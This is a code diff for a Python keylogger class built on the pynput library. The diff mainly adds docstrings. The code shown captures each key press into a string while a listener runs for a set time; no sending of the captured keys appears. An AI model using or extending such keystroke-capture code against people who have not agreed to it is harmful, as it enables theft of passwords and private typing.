@@ -2,12 +2,19 @@ from pynput.keyboard import Listener, Key
 import time
 
 class KeyLogger:
+    """An class for managing keyboard
+    """
     def __init__(self):
+        """Init keylogger
+        """
         self.keys = ''
         self.listener = None
-        pass
+        
  
     def on_press(self, key):
+        """Convert a raw key to meaningful key
+        :param key: (str)
+        """
         if type(key) == Key:
             if key == Key.space:
                 self.keys += ' '
@@ -31,6 +38,10 @@ class KeyLogger:
                     self.keys += key.char
     
     def hook_in(self, Xtime): 
+        """Listen raw keys from user keyboard
+        :param Xtime: (int)
+        :return: (str) a list of raw keys
+        """
         self.listener = Listener(on_press = self.on_press)
         self.listener.start()
         time.sleep(Xtime)
